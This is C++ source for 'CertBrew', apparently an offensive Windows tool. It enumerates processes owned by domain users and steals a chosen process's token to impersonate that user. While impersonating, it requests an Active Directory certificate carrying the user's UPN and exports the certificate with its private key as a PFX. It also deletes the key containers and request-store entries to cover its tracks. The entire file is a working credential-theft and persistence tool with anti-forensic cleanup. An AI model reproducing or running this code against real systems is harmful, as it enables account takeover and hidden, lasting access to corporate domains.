#define SECURITY_WIN32 
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h> 
#include <stdio.h> 
#include <tlhelp32.h> 
#include <wchar.h> 
#include <sspi.h> 
#include <secext.h> 
#include <iostream> 
#include <vector> 
#include <string> 
#include <sstream> 
#include <algorithm> 
#include <fstream> 
#include <ncrypt.h>

#include <comdef.h>
#include <atlbase.h> 
#include <certenroll.h> 
#include <certcli.h> 
#include <certsrv.h> 

#pragma comment(lib, "secur32.lib") 
#pragma comment(lib, "netapi32.lib") 
#pragma comment(lib, "crypt32.lib") 
#pragma comment(lib, "advapi32.lib") 
#pragma comment(lib, "ole32.lib") 
#pragma comment(lib, "oleaut32.lib") 
#pragma comment(lib, "ncrypt.lib")

std::wstring g_OutFile = L"";

void PrintBanner() {
    const char* banner =
        "\n"
        "   _.._..,_,_          ____          __  ____                  \n"
        "  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __ \n"
        "   ]~,\"-.-~~[        | |   / _ \\ '__| __|  _ \\| '__/ _ \\ \\ /\\ / / \n"
        " .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\\ V  V /  \n"
        " | ]:: '    [         \\____\\___|_|   \\__|____/|_|  \\___| \\_/\\_/   \n"
        " '=]): .)  ([                                                       \n"
        "   |:: '    |            -- Made by Wuentin --                        \n"
        "    ~~----~~                                                      \n\n";

    printf("%s", banner);
}

void LogMessage(const wchar_t* format, ...) {
    va_list args;
    va_start(args, format);
    vwprintf(format, args);
    va_end(args);
}

struct ComException : public std::runtime_error {
    HRESULT hr;
    ComException(HRESULT code, const std::string& msg)
        : std::runtime_error(msg), hr(code) {}
};

inline void ThrowIfFailed(HRESULT hr, const char* msg) {
    if (FAILED(hr)) {
        char* sysMsg = nullptr;
        FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, hr, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&sysMsg, 0, NULL
        );

        std::string errorDesc = "Unknown Error";
        if (sysMsg) {
            errorDesc = sysMsg;
            while (!errorDesc.empty() && (errorDesc.back() == '\r' || errorDesc.back() == '\n')) {
                errorDesc.pop_back();
            }
            LocalFree(sysMsg);
        }

        std::ostringstream oss;
        oss << "\n[!] CertBrew error: " << msg << " - Reason: " << errorDesc << " (Code: 0x" << std::hex << hr << ")";
        throw ComException(hr, oss.str());
    }
}

std::wstring GetUPN() {
    DWORD len = 0;
    GetUserNameExW(NameUserPrincipal, nullptr, &len);
    if (len == 0) return L"";
    std::vector<wchar_t> buf(len);
    if (!GetUserNameExW(NameUserPrincipal, buf.data(), &len)) return L"";
    return std::wstring(buf.data());
}

BOOL SetPrivilege(HANDLE hToken, LPCWSTR priv) {
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(NULL, priv, &luid)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) && (GetLastError() == ERROR_SUCCESS);
}

BOOL EnableDebugPrivilege() {
    HANDLE h = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &h)) {
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h)) return FALSE;
        }
        else return FALSE;
    }
    BOOL r = SetPrivilege(h, L"SeDebugPrivilege");
    CloseHandle(h);
    return r;
}

BOOL IsDomainUserAccount(HANDLE hToken, std::wstring& outUser) {
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
    std::vector<BYTE> buffer(dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) return FALSE;

    PSID pSid = pTokenUser->User.Sid;
    if (IsWellKnownSid(pSid, WinLocalSid) || IsWellKnownSid(pSid, WinLocalSystemSid) ||
        IsWellKnownSid(pSid, WinServiceSid) || IsWellKnownSid(pSid, WinLocalServiceSid) ||
        IsWellKnownSid(pSid, WinNetworkServiceSid)) return FALSE;

    WCHAR name[256] = { 0 }, domain[256] = { 0 };
    DWORD nSize = 256, dSize = 256;
    SID_NAME_USE sidType;
    if (!LookupAccountSidW(NULL, pSid, name, &nSize, domain, &dSize, &sidType)) return FALSE;

    if (sidType == SidTypeUser) {
        if (_wcsicmp(domain, L"NT AUTHORITY") == 0) return FALSE;
        if (_wcsicmp(domain, L"Window Manager") == 0) return FALSE;
        if (_wcsicmp(domain, L"Font Driver Host") == 0) return FALSE;
        outUser = std::wstring(domain) + L"\\" + std::wstring(name);
        return TRUE;
    }
    return FALSE;
}

void ListDomainProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        LogMessage(L"[-] CreateToolhelp32Snapshot failed.\n");
        return;
    }

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return; }

    std::wcout << L"\n[+] Scanning processes for domain user tokens...\n";
    std::wcout << L"PID      | USER                           | PROCESS\n";
    std::wcout << L"----------------------------------------------------------\n";
    std::wcout.flush();

    do {
        HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (p) {
            HANDLE t;
            if (OpenProcessToken(p, TOKEN_QUERY, &t)) {
                std::wstring userStr;
                if (IsDomainUserAccount(t, userStr)) {
                    wchar_t line[512];
                    swprintf_s(line, 512, L"%-8d | %-30s | %s\n", pe.th32ProcessID, userStr.c_str(), pe.szExeFile);

                    const int CHUNK_SIZE = 32;
                    const wchar_t* ptr = line;
                    size_t remaining = wcslen(line);
                    while (remaining > 0) {
                        size_t len = (std::min)((size_t)CHUNK_SIZE, remaining);
                        std::wcout.write(ptr, len);
                        std::wcout.flush();
                        ptr += len;
                        remaining -= len;
                    }
                }
                CloseHandle(t);
            }
            CloseHandle(p);
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
}

BOOL DeleteKeyMaterial(PCCERT_CONTEXT pCertContext) {
    DWORD cbData = 0;
    if (!CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &cbData)) return FALSE;
    std::vector<BYTE> buffer(cbData);
    if (!CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, buffer.data(), &cbData)) return FALSE;

    CRYPT_KEY_PROV_INFO* pInfo = reinterpret_cast<CRYPT_KEY_PROV_INFO*>(buffer.data());
    if (!pInfo->pwszContainerName || !pInfo->pwszProvName) return FALSE;

    BOOL isMachine = (pInfo->dwFlags & CRYPT_MACHINE_KEYSET) != 0;
    LogMessage(L"[*] Cleanup: Provider='%s', Type=%d, Container='%s'\n", pInfo->pwszProvName, pInfo->dwProvType, pInfo->pwszContainerName);

    BOOL isLegacyProvider = (wcsstr(pInfo->pwszProvName, L"Cryptographic Provider") != NULL);

    if (pInfo->dwProvType == 0 && isLegacyProvider) {
        LogMessage(L"[!] Warning: Provider indicates CAPI Legacy but Type was 0. Forcing PROV_RSA_FULL (1).\n");
        pInfo->dwProvType = PROV_RSA_FULL;
    }

    if (pInfo->dwProvType != 0) {
        LogMessage(L"[*] Executing CAPI Cleanup (CryptAcquireContext)...\n");
        HCRYPTPROV hProv = 0;
        DWORD flags = CRYPT_DELETEKEYSET;
        if (isMachine) flags |= CRYPT_MACHINE_KEYSET;

        if (CryptAcquireContextW(&hProv, pInfo->pwszContainerName, pInfo->pwszProvName, pInfo->dwProvType, flags)) {
            LogMessage(L"[+] CAPI Key Container deleted successfully.\n");
            return TRUE;
        }
        else {
            DWORD err = GetLastError();
            LogMessage(L"[-] CAPI Cleanup (Type %d) failed (0x%x). Retrying with PROV_RSA_AES (24)...\n", pInfo->dwProvType, err);
            if (CryptAcquireContextW(&hProv, pInfo->pwszContainerName, pInfo->pwszProvName, 24, flags)) {
                LogMessage(L"[+] CAPI Key Container deleted successfully (via Type 24).\n");
                return TRUE;
            }
            LogMessage(L"[-] All CAPI Cleanup attempts failed.\n");
            return FALSE;
        }
    }
    else {
        LogMessage(L"[*] Executing CNG Cleanup (NCrypt)...\n");
        NCRYPT_PROV_HANDLE hProv = NULL;
        NCRYPT_KEY_HANDLE hKey = NULL;
        SECURITY_STATUS status;

        status = NCryptOpenStorageProvider(&hProv, pInfo->pwszProvName, 0);
        if (status == ERROR_SUCCESS) {
            DWORD keyFlags = isMachine ? NCRYPT_MACHINE_KEY_FLAG : 0;
            status = NCryptOpenKey(hProv, &hKey, pInfo->pwszContainerName, 0, keyFlags | NCRYPT_SILENT_FLAG);
            if (status == ERROR_SUCCESS) {
                status = NCryptDeleteKey(hKey, 0);
                if (status == ERROR_SUCCESS) {
                    LogMessage(L"[+] CNG Key deleted successfully.\n");
                    NCryptFreeObject(hProv);
                    return TRUE;
                }
                else {
                    LogMessage(L"[-] NCryptDeleteKey failed: 0x%x\n", status);
                }
            }
            else {
                LogMessage(L"[-] NCryptOpenKey failed: 0x%x\n", status);
            }
            NCryptFreeObject(hProv);
        }
        else {
            LogMessage(L"[-] NCryptOpenStorageProvider failed: 0x%x\n", status);
        }
        LogMessage(L"[-] CNG Cleanup failed.\n");
        return FALSE;
    }
}

void RemoveRequestArtifactByPublicKey(PCCERT_CONTEXT pResultCert) {
    if (!pResultCert) return;
    LogMessage(L"[*] Cleanup: Searching Request store for matching Public Key...\n");

    HCERTSTORE hRequestStore = CertOpenStore(
        CERT_STORE_PROV_SYSTEM,
        0, NULL,
        CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG,
        L"Request"
    );

    if (!hRequestStore) {
        LogMessage(L"[-] Cleanup: Could not open Request store.\n");
        return;
    }

    PCCERT_CONTEXT pArtifact = NULL;
    PCCERT_CONTEXT pPrev = NULL;
    int count = 0;

    while ((pArtifact = CertFindCertificateInStore(
        hRequestStore,
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        0,
        CERT_FIND_PUBLIC_KEY,
        &(pResultCert->pCertInfo->SubjectPublicKeyInfo),
        pPrev)) != NULL) {

        pPrev = pArtifact;

        if (CertDeleteCertificateFromStore(CertDuplicateCertificateContext(pArtifact))) {
            LogMessage(L"[+] Cleanup Request: Artifact removed successfully.\n");
            count++;
            pPrev = NULL;
        }
        else {
            LogMessage(L"[-] Cleanup Request: Found artifact but failed to delete.\n");
        }
    }

    if (count == 0) {
        LogMessage(L"[*] Cleanup Request: No matching artifact found (Store might be clean).\n");
    }

    CertCloseStore(hRequestStore, 0);
}

// CSR generation and private key configuration
BOOL GenerateCSR(const wchar_t* templateName, const wchar_t* email, BSTR* outCsr, CComBSTR& outContainerName, CComBSTR& outProviderName) {
    try {
        // Retrieve the User's Principal Name
        std::wstring upn = GetUPN();
        if (upn.empty()) throw std::runtime_error("UPN not found");
        LogMessage(L"[*] Target UPN retrieved: %s\n", upn.c_str());

        std::wstring subject = L"CN=" + upn;

        // Initialize a PKCS#10 request from the chosen AD template
        CComPtr<IX509CertificateRequestPkcs10> req;
        ThrowIfFailed(req.CoCreateInstance(__uuidof(CX509CertificateRequestPkcs10)), "PKCS10");
        ThrowIfFailed(req->InitializeFromTemplateName(ContextUser, CComBSTR(templateName)), "InitializeFromTemplate");

        // Configure the private key & make it exportable for later use
        CComPtr<IX509PrivateKey> key;
        ThrowIfFailed(req->get_PrivateKey(&key), "get_PrivateKey");
        key->put_ExportPolicy(XCN_NCRYPT_ALLOW_EXPORT_FLAG);

        // Build Subject DN and embed it into the request
        CComPtr<IX500DistinguishedName> dn;
        ThrowIfFailed(dn.CoCreateInstance(__uuidof(CX500DistinguishedName)), "DN");
        ThrowIfFailed(dn->Encode(CComBSTR(subject.c_str()), XCN_CERT_NAME_STR_NONE), "DN encode");
        ThrowIfFailed(req->put_Subject(dn), "put_Subject");

        // Add SAN containing the user's UPN (required for AD certificate mapping)
        CComPtr<IAlternativeNames> sanList;
        ThrowIfFailed(sanList.CoCreateInstance(__uuidof(CAlternativeNames)), "SAN list");

        CComPtr<IAlternativeName> sanUpn;
        ThrowIfFailed(sanUpn.CoCreateInstance(__uuidof(CAlternativeName)), "SAN UPN");
        ThrowIfFailed(sanUpn->InitializeFromString(XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME, CComBSTR(upn.c_str())), "SAN UPN init");
        ThrowIfFailed(sanList->Add(sanUpn), "Add SAN UPN");

        if (email && wcslen(email) > 0) {
            LogMessage(L"[*] Adding email to SAN: %s\n", email);
            CComPtr<IAlternativeName> sanEmail;
            ThrowIfFailed(sanEmail.CoCreateInstance(__uuidof(CAlternativeName)), "SAN Email");
            ThrowIfFailed(sanEmail->InitializeFromString(XCN_CERT_ALT_NAME_RFC822_NAME, CComBSTR(email)), "SAN Email init");
            ThrowIfFailed(sanList->Add(sanEmail), "Add SAN Email");
        }

        CComPtr<IX509ExtensionAlternativeNames> sanExt;
        ThrowIfFailed(sanExt.CoCreateInstance(__uuidof(CX509ExtensionAlternativeNames)), "SAN ext");
        ThrowIfFailed(sanExt->InitializeEncode(sanList), "SAN encode");

        CComPtr<IX509Extensions> exts;
        ThrowIfFailed(req->get_X509Extensions(&exts), "get_X509Extensions");
        ThrowIfFailed(exts->Add(sanExt), "Add extension");

        // Build the signed PKCS#10 request (CSR)
        CComPtr<IX509Enrollment> enroll;
        ThrowIfFailed(enroll.CoCreateInstance(__uuidof(CX509Enrollment)), "Enrollment");
        ThrowIfFailed(enroll->InitializeFromRequest(req), "InitEnroll");
        ThrowIfFailed(enroll->CreateRequest(XCN_CRYPT_STRING_BASE64, outCsr), "CreateRequest");

        // Retrieving metadata from the container
        ThrowIfFailed(key->get_ContainerName(&outContainerName), "get_ContainerName");
        ThrowIfFailed(key->get_ProviderName(&outProviderName), "get_ProviderName");

        return TRUE;
    }
    catch (std::exception& ex) {
        LogMessage(L"[-] GenerateCSR Error: %S\n", ex.what());
        return FALSE;
    }
}

std::wstring GetSystemMessage(HRESULT hr) {
    if (hr == 0) return L"Success";

    LPWSTR messageBuffer = nullptr;
    size_t size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        hr,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&messageBuffer,
        0,
        NULL
    );

    std::wstring message(L"Unknown Error");
    if (messageBuffer) {
        message = messageBuffer;
        while (!message.empty() && (message.back() == L'\r' || message.back() == L'\n')) {
            message.pop_back();
        }
        LocalFree(messageBuffer);
    }
    return message;
}

std::wstring GetDispositionString(LONG disp) {
    switch (disp) {
    case CR_DISP_INCOMPLETE: return L"INCOMPLETE (0)";
    case CR_DISP_ERROR:      return L"ERROR (1)";
    case CR_DISP_DENIED:     return L"DENIED (2)";
    case CR_DISP_ISSUED:     return L"ISSUED (3)";
    case CR_DISP_ISSUED_OUT_OF_BAND: return L"ISSUED_OUT_OF_BAND (4)";
    case CR_DISP_UNDER_SUBMISSION:   return L"PENDING (5)";
    case CR_DISP_REVOKED:    return L"REVOKED (6)";
    default: return L"UNKNOWN (" + std::to_wstring(disp) + L")";
    }
}

// Submit a Base64 - encoded CSR to the target CA via DCOM
BOOL SubmitToCA(const wchar_t* caName, BSTR csr, BSTR* outCertB64) {
    try {
        LogMessage(L"[*] Submitting request to CA: %s\n", caName);
        CComPtr<ICertRequest2> icr;
        ThrowIfFailed(icr.CoCreateInstance(__uuidof(CCertRequest)), "CertRequest");

        LONG disp = 0;
        HRESULT hrSubmit = icr->Submit(CR_IN_BASE64 | CR_IN_PKCS10, csr, NULL, CComBSTR(caName), &disp);
        ThrowIfFailed(hrSubmit, "Submit");

        // If it is not issued (3), it is a problem 
        if (disp != CR_DISP_ISSUED) {
            HRESULT hrLastStatus = 0;
            icr->GetLastStatus(&hrLastStatus);

            CComBSTR bstrMsg;
            icr->GetDispositionMessage(&bstrMsg);

            std::wstring statusMsg = GetSystemMessage(hrLastStatus);
            std::wstring dispStr = GetDispositionString(disp);

            LogMessage(L"[-] Request NOT issued.\n");
            LogMessage(L"    Status:         %s\n", dispStr.c_str());
            LogMessage(L"    CA error code:  0x%x\n", hrLastStatus);
            LogMessage(L"    Error meaning:  %s\n", statusMsg.c_str());

            if (bstrMsg) {
                LogMessage(L"    CA message:     %s\n", bstrMsg.m_str);
            }

            if (disp == CR_DISP_UNDER_SUBMISSION) {
                LogMessage(L"[*] Request is pending admin approval. Request ID returned.\n");
                return FALSE;
            }

            throw std::runtime_error("Certificate request failed (Denied or Error).");
        }

        ThrowIfFailed(icr->GetCertificate(XCN_CRYPT_STRING_BASE64HEADER, outCertB64), "GetCertificate");
        LogMessage(L"[+] Certificate issued successfully!\n");
        return TRUE;
    }
    catch (std::exception& ex) {
        LogMessage(L"[-] SubmitToCA Error: %S\n", ex.what());
        return FALSE;
    }
}

// Reconstruct a full PFX(certificate + private key) entirely in memory
BOOL CreatePFXInMemory(BSTR certB64, BSTR containerName, BSTR providerName, const wchar_t* password, std::vector<BYTE>& outPfxData, PCCERT_CONTEXT* outCertContext) {
    PCCERT_CONTEXT pCertContext = NULL;
    PCCERT_CONTEXT pStoreContext = NULL;
    HCERTSTORE hStore = NULL;

    try {
        // Decode issued certificate from Base64 => DER => CertContext
        DWORD certLen = 0;
        std::wstring wCertB64(certB64, SysStringLen(certB64));
        CryptStringToBinaryW(wCertB64.c_str(), 0, CRYPT_STRING_BASE64HEADER, NULL, &certLen, NULL, NULL);
        std::vector<BYTE> certBlob(certLen);
        if (!CryptStringToBinaryW(wCertB64.c_str(), 0, CRYPT_STRING_BASE64HEADER, certBlob.data(), &certLen, NULL, NULL))
            throw std::runtime_error("CryptStringToBinaryW failed");

        pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, certBlob.data(), certLen);
        if (!pCertContext) throw std::runtime_error("CertCreateCertificateContext failed");

        BYTE thumb[20];
        DWORD thumbSize = 20;
        if (CertGetCertificateContextProperty(pCertContext, CERT_HASH_PROP_ID, thumb, &thumbSize)) {
            LogMessage(L"[*] Certificate Thumbprint: ");
            for (DWORD i = 0; i < thumbSize; i++) {
                wprintf(L"%02X", thumb[i]);
            }
            wprintf(L"\n");
        }

        // Create an in-memory certificate store and insert the issued cert
        hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, NULL, 0, NULL);
        if (!hStore) throw std::runtime_error("CertOpenStore failed");

        if (!CertAddCertificateContextToStore(hStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreContext))
            throw std::runtime_error("CertAddCertificateContextToStore failed");

        // Bind certificate to its private key container
        CRYPT_KEY_PROV_INFO provInfo = {};
        provInfo.pwszContainerName = containerName;
        provInfo.pwszProvName = providerName;
        provInfo.dwProvType = 0;
        provInfo.dwKeySpec = 0;

        if (!CertSetCertificateContextProperty(pStoreContext, CERT_KEY_PROV_INFO_PROP_ID, 0, &provInfo))
            throw std::runtime_error("CertSetCertificateContextProperty failed");

        // Export the fully reconstructed PFX
        LogMessage(L"[*] Exporting PFX from memory store...\n");
        CRYPT_DATA_BLOB pfxBlob = {};
        if (!PFXExportCertStoreEx(hStore, &pfxBlob, password, NULL, EXPORT_PRIVATE_KEYS))
            throw std::runtime_error("PFXExportCertStoreEx (size) failed");

        outPfxData.resize(pfxBlob.cbData);
        pfxBlob.pbData = outPfxData.data();

        if (!PFXExportCertStoreEx(hStore, &pfxBlob, password, NULL, EXPORT_PRIVATE_KEYS))
            throw std::runtime_error("PFXExportCertStoreEx (data) failed");

        *outCertContext = CertDuplicateCertificateContext(pStoreContext);

        CertFreeCertificateContext(pStoreContext);
        CertFreeCertificateContext(pCertContext);
        CertCloseStore(hStore, 0);
        return TRUE;
    }
    catch (std::exception& ex) {
        if (pStoreContext) CertFreeCertificateContext(pStoreContext);
        if (pCertContext) CertFreeCertificateContext(pCertContext);
        if (hStore) CertCloseStore(hStore, 0);
        LogMessage(L"[-] CreatePFXInMemory Error: %S\n", ex.what());
        return FALSE;
    }
}

// Output the PFX either to disk (Binary) or to stdout (Base64),
void OutputData(const std::vector<BYTE>& data, const std::wstring& password) {
    if (!g_OutFile.empty()) {
        // PFX format : Binary
        HANDLE hFile = CreateFileW(g_OutFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
            LogMessage(L"[+] SUCCESS. Binary PFX saved to: %s\n", g_OutFile.c_str());
            CloseHandle(hFile);
        }
    }
    else {
        // Convert PFX to Base64 and print to stdout
        DWORD b64Len = 0;
        CryptBinaryToStringW(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
        std::vector<wchar_t> b64Buf(b64Len);
        CryptBinaryToStringW(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Buf.data(), &b64Len);

        LogMessage(L"[+] PFX Base64 (password=%s):\n", password.c_str());
        wprintf(L"%s\n\n", b64Buf.data());
        RtlSecureZeroMemory(b64Buf.data(), b64Buf.size() * sizeof(wchar_t));
    }
}


BOOL ResolveCaConfig(const std::wstring& input, std::wstring& outConfig) {
    std::wstring wantedHost, wantedCa;
    BOOL autoPick = input.empty();

    if (!autoPick) {
        size_t pos = input.find(L'\\');
        if (pos != std::wstring::npos) {
            wantedHost = input.substr(0, pos);
            wantedCa = input.substr(pos + 1);
        }
        else {
            wantedCa = input;
        }
    }

    CComPtr<ICertConfig> cfg;
    HRESULT hr = cfg.CoCreateInstance(__uuidof(CCertConfig));
    if (FAILED(hr)) {
        LogMessage(L"[-] CoCreateInstance(CCertConfig) failed: 0x%x\n", hr);
        return FALSE;
    }

    LONG count = 0;
    hr = cfg->Reset(0, &count);
    if (FAILED(hr) || count == 0) {
        LogMessage(L"[-] No enrollment services found in AD (hr=0x%x, count=%d).\n", hr, count);
        return FALSE;
    }

    LogMessage(L"[*] Enumerating %d CA(s) from AD Enrollment Services...\n", count);
    std::vector<std::wstring> matches;

    do {
        CComBSTR cn, srv, conf;
        if (SUCCEEDED(cfg->GetField(CComBSTR(L"CommonName"), &cn)) &&
            SUCCEEDED(cfg->GetField(CComBSTR(L"Server"), &srv)) &&
            SUCCEEDED(cfg->GetField(CComBSTR(L"Config"), &conf))) {

            LogMessage(L"    - %s\n", conf.m_str);

            if (autoPick) {
                matches.emplace_back(conf);
            }
            else if (_wcsicmp(cn, wantedCa.c_str()) == 0) {
                if (wantedHost.empty()) {
                    matches.emplace_back(conf);
                }
                else {
                    std::wstring s(srv);
                    bool eq = (_wcsicmp(s.c_str(), wantedHost.c_str()) == 0);
                    size_t dot = s.find(L'.');
                    bool nb = (dot != std::wstring::npos &&
                        wantedHost.length() == dot &&
                        _wcsnicmp(s.c_str(), wantedHost.c_str(), dot) == 0);
                    if (eq || nb) matches.emplace_back(conf);
                }
            }
        }
        LONG idx = 0;
        hr = cfg->Next(&idx);
    } while (hr == S_OK);

    if (matches.empty()) {
        LogMessage(L"[-] No CA matching '%s' published in AD.\n", input.c_str());
        return FALSE;
    }
    if (matches.size() > 1) {
        if (autoPick) {
            LogMessage(L"[-] Multiple CAs available. Specify one with /ca:<config>:\n");
        }
        else {
            LogMessage(L"[-] Ambiguous CA name. Re-run with HOST\\CAName:\n");
        }
        for (auto& m : matches) LogMessage(L"      %s\n", m.c_str());
        return FALSE;
    }

    outConfig = matches[0];
    LogMessage(L"[+] CA resolved: %s\n", outConfig.c_str());
    return TRUE;
}

// Main certificate enrolment function
BOOL PerformCertEnroll(const wchar_t* templateName, const wchar_t* caName, const wchar_t* password, const wchar_t* email) {
    LogMessage(L"[*] Initializing COM library...\n");
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    std::wstring resolvedCa;
    if (caName && *caName) {
        // CA provided
        resolvedCa = caName;
        LogMessage(L"[*] Using provided CA config: %s\n", resolvedCa.c_str());
    }
    else {
        // Query AD for published enrollment services
        if (!ResolveCaConfig(L"", resolvedCa)) {
            CoUninitialize();
            return FALSE;
        }
    }
    CComBSTR bstrContainerName;
    CComBSTR bstrProviderName;
    BSTR csr = nullptr;
    BSTR certB64 = nullptr;
    std::vector<BYTE> pfxData;
    PCCERT_CONTEXT pCleanupCert = NULL;
    BOOL success = FALSE;

    if (GenerateCSR(templateName, email, &csr, bstrContainerName, bstrProviderName)) {
        if (SubmitToCA(resolvedCa.c_str(), csr, &certB64)) {
            if (CreatePFXInMemory(certB64, bstrContainerName, bstrProviderName, password, pfxData, &pCleanupCert)) {
                OutputData(pfxData, password);

                if (pCleanupCert) {
                    DeleteKeyMaterial(pCleanupCert);
                    RemoveRequestArtifactByPublicKey(pCleanupCert);
                    CertFreeCertificateContext(pCleanupCert);
                }

                success = TRUE;
            }
        }
    }

    if (!pfxData.empty()) RtlSecureZeroMemory(pfxData.data(), pfxData.size());
    if (csr) SysFreeString(csr);
    if (certB64) SysFreeString(certB64);

    CoUninitialize();
    return success;
}

BOOL StealAndEnroll(DWORD pid, wchar_t* tmpl, wchar_t* ca, wchar_t* pass, wchar_t* email) {
    LogMessage(L"[*] Opening process PID: %lu\n", pid);
    HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!p && EnableDebugPrivilege()) p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!p) { LogMessage(L"[-] OpenProcess failed.\n"); return FALSE; }

    HANDLE tok;
    if (!OpenProcessToken(p, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &tok)) {
        CloseHandle(p); return FALSE;
    }
    CloseHandle(p);

    LogMessage(L"[*] Duplicating and impersonating user...\n");
    if (!ImpersonateLoggedOnUser(tok)) { CloseHandle(tok); return FALSE; }

    std::wstring spoofedUpn = GetUPN();
    LogMessage(L"[+] Impersonation OK. Context: %s. Starting enrollment routine...\n", spoofedUpn.c_str());

    BOOL ok = PerformCertEnroll(tmpl, ca, pass, email);

    RevertToSelf();
    CloseHandle(tok);
    return ok;
}

void PrintUsage(const wchar_t* exe) {
    PrintBanner();
    wprintf(L"Usage:\n");
    wprintf(L"  %s /list\n", exe);
    wprintf(L"  %s /steal /pid:<PID> /template:<Template> /pass:<password> [/ca:<CA>] [/email:<email>] [/outfile:<file>]\n", exe);
}


BOOL ValidateCaArgument(const std::wstring& ca) {
    if (ca.empty()) return TRUE; // empty = auto-pick mode (enumeration)
    if (ca.find_first_of(L" \t\r\n\"") != std::wstring::npos) return FALSE;
    size_t pos = ca.find(L'\\');
    if (pos == std::wstring::npos) return FALSE;                       // must contain HOST\CA
    if (pos == 0 || pos == ca.length() - 1) return FALSE;
    if (ca.find(L'\\', pos + 1) != std::wstring::npos) return FALSE;   // exactly one '\'
    return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    PrintBanner();
    bool doSteal = false;
    bool doList = false;
    DWORD pid = 0;
    std::wstring tmpl, ca, pass, email;

    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/list") == 0) doList = true;
        else if (_wcsicmp(argv[i], L"/steal") == 0) doSteal = true;
        else if (_wcsnicmp(argv[i], L"/pid:", 5) == 0) pid = _wtol(argv[i] + 5);
        else if (_wcsnicmp(argv[i], L"/template:", 10) == 0) tmpl = argv[i] + 10;
        else if (_wcsnicmp(argv[i], L"/ca:", 4) == 0) ca = argv[i] + 4;
        else if (_wcsnicmp(argv[i], L"/pass:", 6) == 0) pass = argv[i] + 6;
        else if (_wcsnicmp(argv[i], L"/email:", 7) == 0) email = argv[i] + 7;
        else if (_wcsnicmp(argv[i], L"/outfile:", 9) == 0) g_OutFile = argv[i] + 9;
    }

    if (doList) {
        ListDomainProcesses();
        return 0;
    }



    if (doSteal) {
        if (pid == 0 || tmpl.empty() || pass.empty()) {
            LogMessage(L"[-] Missing arguments for /steal.\n");
            PrintUsage(argv[0]);
            return 1;
        }
        if (!ValidateCaArgument(ca)) {
            LogMessage(L"[-] Invalid /ca format. Expected 'HOST\\CAName'.\n");
            return 1;
        }
        if (ca.empty()) {
            LogMessage(L"[*] No /ca specified - auto-resolution mode.\n");
        }
        if (!StealAndEnroll(pid, (wchar_t*)tmpl.c_str(), (wchar_t*)ca.c_str(),
            (wchar_t*)pass.c_str(), (wchar_t*)email.c_str())) {
            LogMessage(L"[-] CertBrew failed.\n");
            return 1;
        }
        return 0;
    }

    PrintUsage(argv[0]);
    return 1;
}